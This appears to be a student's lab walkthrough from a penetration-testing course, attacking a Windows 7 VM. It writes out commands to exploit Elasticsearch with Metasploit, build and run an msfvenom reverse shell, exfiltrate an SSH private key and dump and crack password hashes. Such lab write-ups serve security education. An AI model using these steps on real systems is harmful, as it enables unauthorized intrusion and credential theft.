# 🖥️ **Windows 7 Penetration Test**

## 📝 **Objective**
This is a walkthrough showing the steps I took to identify and exploit vulnerabilities in a **Windows 7 Virtual Image** as part of my **CIS4200 Penetration Testing** course at **USF**.

---

## 🛠️ **Skills Learned**
- Network scanning and enumeration using Nmap and ARP-Scan
- Vulnerability scanning with Nessus
- Exploiting known vulnerabilities using Metasploit
- Creating and deploying reverse shells using MsfVenom
- Capturing and analyzing network traffic with Wireshark
- Privilege escalation and post-exploitation techniques
- Password cracking and hashdump analysis

---

## 🧰 **Tools Used**
- **Kali Linux (Oracle VM)**
- **Windows 7 VM (Oracle VM)**
- **Nessus**
- **Metasploit Framework (MsfConsole)**
- **MsfVenom**
- **Wireshark**
- **Nmap**


## 📋 Steps

Since this was a class assignment for **CIS4200 Penetration Testing at USF**, I cannot share the virtual image, but I will explain the steps taken.

---

### 1️⃣ Set Up the Virtual Environment
- After downloading the virtual image and uploading it to **Oracle VirtualBox**:
  - **Start the machine.**

### 2️⃣ Start the Kali Linux Machine
- Open the command terminal in your Kali Linux machine.

### 3️⃣ Find the IP Address of the Target Machine
Run the following command in the Kali terminal to scan for devices on the host-only network:
```bash
sudo arp-scan --interface=<interface_name> 192.168.56.0/24
```

<img width="400" alt="image" src="https://github.com/user-attachments/assets/1cacd25d-3cc3-41e4-bc78-49b12bc87dac" />

### 📝 **Notes:**
- I chose **192.168.56.141** as the target IP because, during my **Nmap** scan, **192.168.56.100** was down.
- To find the correct **interface name**, run the following command in the Kali terminal:
```bash
ifconfig
```
- The **interface name** will be the **eth** device associated with your **host-only network**.

<img width="200" alt="image" src="https://github.com/user-attachments/assets/c4bbe9ef-b3df-4446-8338-f10a754572ba" />

---

### 4️⃣ Run a Nessus Scan on the Target Machine
1. **Start the Nessus service**:
   ```bash
   sudo systemctl start nessusd.service
   ```
2. **Open Firefox and access Nessus**:
   ```bash
   firefox https://kali:8834/ &
   ```
3. **Log in to your Nessus account**.
4. **Run a Basic Scan and Advanced Scan**:
   - These scans reveal vulnerabilities that can be exploited.
   - **Elasticsearch** was identified as a critical vulnerability.
   - **Advanced & Basic Scan**:
  
<img width="400" alt="image" src="https://github.com/user-attachments/assets/cc8b5694-12a3-4657-8b3f-ce440fc2e07f" />
  
<img width="400" alt="image" src="https://github.com/user-attachments/assets/0b5f32ed-04c8-4cff-ab51-ec05d638b6c2" />

---

### 5️⃣ **Run MsfConsole for Exploitation**
1. **Start MsfConsole**:
   ```bash
   msfconsole
   ```
2. **Initialize the database**:
   ```bash
   sudo systemctl enable postgresql
   sudo msfdb init
   ```

<img width="400" alt="image" src="https://github.com/user-attachments/assets/a919b6d0-b0ba-49ea-b048-c4060019a56c" />
<img width="400" alt="image" src="https://github.com/user-attachments/assets/24412c25-2e9c-4c17-bba3-279157eb3637" />


3. **Check PostgreSQL status** if you encounter connection errors:
   ```bash
   sudo systemctl status postgresql
   ```
<img width="400" alt="image" src="https://github.com/user-attachments/assets/9d4ea54e-d132-4b29-895c-696eb8373b11" />

4. **Create a workspace**:
   ```bash
   workspace -a hackit
   ```
<img width="200" alt="image" src="https://github.com/user-attachments/assets/407a6186-de11-4599-bb74-6874e14052c3" />

---

### 6️⃣ **Run Nmap Scans Using MsfConsole**
- **Full TCP Scan**:
   ```bash
   db_nmap -sV -p- <IP chosen>
   ```
<img width="400" alt="image" src="https://github.com/user-attachments/assets/6f085fa5-ded7-46e0-8eda-ade35eab904a" />

- **UDP Top 1000 Ports Scan**:
   ```bash
   db_nmap -sU --top-ports 1000 <IP chosen>
   ```
<img width="400" alt="image" src="https://github.com/user-attachments/assets/05e703dd-aff5-4f13-a13e-7c9ac968dadb" />


- **OS and Service Detection**:
   ```bash
   db_nmap -O <IP chosen>
   ```
<img width="400" alt="image" src="https://github.com/user-attachments/assets/928b14ce-f076-4b25-b471-6b9503bf0696" />

---

### 7️⃣ **Import Nessus File to MsfConsole**
1. **Locate the Nessus file**.
2. **Import the file into MsfConsole**:
   ```bash
   db_import <path/to/nessusfile>
   ```
<img width="400" alt="image" src="https://github.com/user-attachments/assets/0ec191d0-6b47-41de-9597-535667f10662" />

---

### 8️⃣ **Exploit Elasticsearch Vulnerability**
1. **Search for the Elasticsearch exploit**:
   ```bash
   search elasticsearch
   ```
<img width="400" alt="image" src="https://github.com/user-attachments/assets/6c7f3d77-cefa-4c7d-9a1c-b6dcc17abb5b" />

2. **Use the first exploit found**:
   ```bash
   use exploit/multi/elasticsearch/script_mvel_rce
   ```
3. **Configure the options**:
   ```bash
   set RHOST 192.168.56.141
   set LHOST 192.168.56.104
   ```
4. **Run the exploit**:
   ```bash
   run
   ```
<img width="400" alt="image" src="https://github.com/user-attachments/assets/bb671320-19ee-4fc6-b599-223e92b7cb8e" />

✅ This will start a **Meterpreter session**.

---

### 9️⃣ **Create a Reverse Shell with MsfVenom**
1. **Open a second terminal** in Kali.
2. **Run the following command to create the reverse shell**:
   ```bash
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your HOST ONLY IP> LPORT=<your port> -f exe -o reverse.exe
   ```
<img width="400" alt="image" src="https://github.com/user-attachments/assets/51e989ca-76e7-4f4a-b0b5-b873e0f1c1b1" />

3. **Set up a listener** in the same terminal:
   ```bash
   msfconsole
   workspace hackit
   use exploit/multi/handler
   set payload windows/meterpreter/reverse_tcp
   set LHOST <your HOST ONLY IP>
   set LPORT 4444
   run
   ```
<img width="400" alt="image" src="https://github.com/user-attachments/assets/3280cda3-3366-4eff-8c75-4dc4151b77a3" />
<img width="400" alt="image" src="https://github.com/user-attachments/assets/17cc8b03-ef75-497c-88a2-68bcda0b1708" />


---

### 🔟 **Upload and Execute the Reverse Shell**
1. **Go back to the first terminal with the Meterpreter session**.
2. **Upload the reverse shell**:
   ```bash
   upload /path/to/reverse.exe C:\\Windows\\TEMP\\reverse.exe
   ```
<img width="400" alt="image" src="https://github.com/user-attachments/assets/6419a696-96ac-46ce-84ff-35f194d586e3" />

3. **Verify the file upload**:
   ```bash
   dir C:\\Windows\\TEMP
   ```
4. **Execute the reverse shell**:
   ```bash
   execute -f C:\\Windows\\TEMP\\reverse.exe
   ```
<img width="400" alt="image" src="https://github.com/user-attachments/assets/fbda3e5e-0fb3-4264-84f5-dd1bc1f950ee" />

✅ A new Meterpreter session should open on the second terminal, giving you **root privileges**.
<img width="400" alt="image" src="https://github.com/user-attachments/assets/3d09f5ea-e21f-44d2-b24c-191e57e51911" />

---

### 🏁 **Final Steps: Capture the Flags**
1. **Navigate to the user's desktop**:
   ```bash
   dir c:\\Users\\SkipKiddie\\Desktop
   ```
<img width="400" alt="image" src="https://github.com/user-attachments/assets/764d17d9-5616-411c-8c56-468c2662039e" />

2. **Download the `id_rsa` file**:
   ```bash
   download c:\\Users\\SkipKiddie\\Desktop\\id_rsa /home/kali
   ```
<img width="400" alt="image" src="https://github.com/user-attachments/assets/d285da6c-3f1d-4372-ad70-d164d690ae7b" />

3. **Dump the password hashes**:
   ```bash
   hashdump
   ```
<img width="400" alt="image" src="https://github.com/user-attachments/assets/33c342c8-f059-4677-b56a-6d4ebfd35d00" />

### 🧩 **Passwords Cracked:**
| Username      | Password       |
|---------------|----------------|
| anakin        | yipp33!!       |
| artoo         | beep_b00p      |
| ben           | thats_no_moon  |
| boba          | mandalorian1   |
| chewbacca     | rwaaaaawr5     |
| c three pio   | pr0t0c0l       |
| darth vader   | d@rk_sid3      |
| greedo        | hanShotFirst!  |
| han solo      | sh00t-first    |
| jarjar        | mesah_p@ssw0rd |
| kylo ren      | daddy_issues1  |
| lando         | b@ckstab       |
| luke          | use_the_f0rce  |
| skipkiddie    | WhoopWhoop     |

---

✅ **End of Lab**: The assignment was successfully completed by gaining root access and capturing the flag.

